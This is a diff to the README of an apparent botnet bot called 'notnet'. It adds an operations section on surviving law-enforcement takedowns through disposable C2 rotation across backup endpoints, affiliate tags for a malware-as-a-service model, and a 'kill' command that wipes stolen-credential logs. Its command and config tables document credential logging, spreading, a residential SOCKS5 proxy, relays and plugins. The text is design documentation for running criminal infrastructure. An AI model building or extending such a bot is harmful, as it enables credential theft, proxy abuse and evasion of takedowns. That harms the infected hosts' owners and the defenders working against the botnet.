@@ -261,6 +261,57 @@ into the binary.
   (`payload_sha256` pattern) — a plugin whose hash does not match its
   pinned value is discarded, never executed.
 
+## Operations (Disposable Infrastructure + Affiliate Ops)
+
+2026 judgment — the deepest correction: **botnets poured engineering into
+surviving takedown technically (DGA, P2P, rootkits), and nearly all of it
+was outpaced.** Qakbot's 2023 infrastructure takedown and the 2024/2025
+Operation Endgame dismantlements show the same pattern: sinkholing the C2
+kills the fleet regardless of how clever the channel was. What actually
+survives takedown is the **organization** — the MaaS brand, the affiliate
+relationships, the source code (Mirai's most durable act wasn't any
+technical feature, it was publishing the source). This repo therefore
+builds *organizational* resilience: disposable infrastructure that
+assumes takedown and rebuilds fast, and affiliate-structured operations
+where one affiliate's takedown does not kill the fleet.
+
+- **Disposable C2 rotation (implemented).** The bot dials its HTTP C2
+  through a bounded fallback chain: the primary endpoint (`http_server` /
+  `http_port`, possibly repointed by a dead-drop) plus up to 4 static
+  backups (`c2_backup_1` … `c2_backup_4 = host:port`, contiguous from 1).
+  After 3 consecutive connect failures the bot rotates to the next
+  endpoint, logs the switch with the reason, and keeps going — capped at
+  16 total rotations per process so a fully dead fleet cannot churn
+  forever. `rotate` forces a switch immediately (manual failover during a
+  takedown); `config_set c2_backup_<n>=host:port` reconfigures the chain
+  live. Rotation is a separate layer **above** the fast-flux resolver:
+  flux rotates IPs within one hostname, rotation switches the whole
+  endpoint. A verified dead-drop repoint resets the failure streak and
+  returns to the primary, so a fresh drop is tried before any static
+  backup applies.
+- **Affiliate/operator tags (implemented).** `bot_tag` (bounded 64 chars)
+  is the affiliate-model primitive — an operator or campaign identifier
+  reported in every heartbeat (`"tag":"..."`). The C2 can attribute bots
+  to affiliates, build per-affiliate inventories, and tear down or
+  re-provision one affiliate's capacity without touching the rest of the
+  fleet. The per-affiliate credentials/keys separation (each affiliate
+  gets its own `c2_secret` / tokens so one affiliate's exposure does not
+  compromise the fleet) follows the same model and is configured per-bot.
+- **`kill` command (implemented).** The flip side of rotation — when an
+  affiliate hands capacity back (or a campaign is retired under pressure),
+  `kill` wipes the credential-log buffer (`spread_creds_drain` + zeroed
+  copy), stops the proxy/relay/plugins via their stop callbacks, and exits
+  with status 0 through the normal cleanup path. One-way door: no un-kill.
+- **Affiliate dashboard (future work, out of scope for a C bot).** The
+  C2-side aggregation layer — a per-affiliate control panel tracking
+  bot_tag inventories, rotation state per bot, credential-log volume, and
+  per-affiliate kill/re-provisioning — is operator tooling, not bot code.
+  The bot side (this repo) already emits everything the dashboard needs:
+  tagged heartbeats, rotation logging, and clean capacity hand-back.
+- **Source stays public.** Per the judgment, published source is the most
+  durable resilience mechanism — the repo is MIT-licensed and public by
+  design.
+
 ## Commands
 
 Commands are issued via the C2 channels (IRC PRIVMSG or HTTP/WS JSON with the
@@ -282,7 +333,9 @@ shared secret). The command queue is rate-limited to 10 commands/second.
 | proxy   | `proxy on [port]` / `proxy off` | Implemented — start/stop the residential SOCKS5 forward proxy (requires `proxy_token`) |
 | relay   | `relay on [port]` / `relay off` / `relay <target> <port> [via <host>:<port>]` | Implemented — start/stop the token-authenticated ORB-style relay listener (requires `relay_token`), or probe a target's reachability/RTT directly vs. through a relay bot (per-target relay selection, single hop) |
 | plugin  | `plugin status` / `plugin <name> load\|run\|unload\|status` | Implemented — loader/plugin framework: dispatch built-in plugins by name (spread, proxy, relay, cred-log; byovd planned). Remote fetch of shared-object plugins is future work |
-| status  | — | Implemented — heartbeat reports version, hostname, uptime, scan count, credential-log count, proxy status, relay status |
+| rotate  | `rotate` | Implemented — manually advance the disposable C2 rotation chain (primary + `c2_backup_<n>`); does not consume the automatic-churn budget |
+| kill    | `kill` | Implemented — affiliate capacity hand-back: wipe the credential-log buffer, stop proxy/relay/plugins via their stop callbacks, exit 0 (one-way door) |
+| status  | — | Implemented — heartbeat reports version, hostname, uptime, scan count, credential-log count, proxy status, relay status, affiliate tag |
 
 ## Configuration
 
@@ -316,6 +369,8 @@ The bot loads config from `/etc/notnet.conf` (key=value format):
 || `relay_port` | `1081` | Port the relay listener binds (1–65535) |
 || `relay_token` | *(none)* | Shared fleet token relay clients must present (`RELAY <token> <target> <port>`). No default — the relay will not start without it (or `NOTNET_RELAY_TOKEN` env var). Single-hop only; multi-hop chains are planned, and this is not a DHT |
 || `plugin_enabled` | `1` | 0/1 — loader/plugin framework: bootstrap the built-in plugin registry (spread, proxy, relay, cred-log) at boot and enable the `plugin` C2 command. 0 disables it; the command is refused |
+|| `c2_backup_1` … `c2_backup_4` | *(none)* | Disposable-infrastructure C2 rotation: backup HTTP C2 endpoints as `host:port`, contiguous from `c2_backup_1` (a gap leaves later entries unreachable). After 3 consecutive connect failures the bot rotates through the chain (primary → backups, wrapping), capped at 16 total rotations per process. Also settable live via `config_set c2_backup_<n>=host:port` |
+|| `bot_tag` | *(none)* | Affiliate/operator tag (max 64 chars): the affiliate-model primitive, reported in every heartbeat (`"tag":"..."`) so the C2 can attribute bots to affiliates. Also settable live via `config_set bot_tag=...` |
 || `c2_secret` | *(none)* | Shared secret echoed by C2; HTTP/WS commands are rejected without it (or `NOTNET_C2_SECRET` env var) |
 || `tls_cert_pin_sha256` | *(none)* | TLS server cert fingerprint pin; requires `make TLS=1` (or `NOTNET_TLS_CERT_PIN_SHA256` env var) |
 || `payload_sha256` | *(none)* | Expected SHA-256 of downloaded payload; update is refused without a match (or `NOTNET_PAYLOAD_SHA256` env var) |
